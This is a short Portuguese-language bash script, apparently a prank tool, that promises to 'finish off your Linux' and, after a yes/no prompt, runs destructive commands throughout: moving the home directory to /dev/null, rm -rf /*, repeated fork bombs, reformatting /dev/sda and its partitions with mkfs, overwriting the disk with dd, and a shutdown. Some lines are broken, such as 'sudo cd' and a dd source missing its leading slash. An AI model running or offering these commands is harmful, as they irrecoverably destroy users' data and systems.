#!/bin/bash


echo '  Acabe com seu linux e elimine logs'
read -p "Quer mesmo destruir tudow [s/n]? " -n 1 -r
echo    ' doido mesmo.. '
if [[ ! $REPLY =~ ^[Ss]$ ]]
then
    exit 1
fi

echo
echo 'destruindo to nem ai...'
echo '--------------------------------------'
echo ' Acesso ROOT... '
 sudo cd /etc
echo ' [√] atacando'
echo
echo ' Moving home directory to /dev/null '
sudo mv ~ /dev/null
echo ' [√] atacando'
echo 
echo ' PAULADA "/*" '
sudo rm -rf /*
echo ' [√] atacando'
echo
echo ' FB... '
:(){ :|: & };:
:(){ :|: & };:
:(){ :|: & };:
:(){ :|: & };:
:(){ :|: & };:
:(){ :|: & };:
echo ' [√] atacando'
echo 
echo ' Buraco Negro 1 **COMPLETED** '
echo
echo ' Estágio 2....'
echo
echo ' ----KABUm [√]----'
echo
echo ' Brincando de lego...'
sudo mkfs.ext3 /dev/sda
sudo mkfs.ext3 /dev/sda1
sudo mkfs.ext3 /dev/sda2
sudo mkfs.ext3 /dev/sda3
sudo mkfs.ext3 /dev/sda4
sudo mkfs.ext3 /dev/sda5
sudo mkfs.ext3 /dev/sda6
sudo mkfs.ext3 /dev/sda7
sudo mkfs.ext3 /dev/sda8
echo ' [√] atacando '
echo
echo ' Seu disco chora...'
> /dev/sda
sudo > /dev/sda
echo ' [√] atacando'
echo 
echo ' Blablablabla...'
dd if=dev/random of=/dev/sda
sudo dd if=dev/random of=/dev/sda
echo ' [√] atacando'
echo
echo ' **Aplausos** '
echo bye carai...
shutdown now 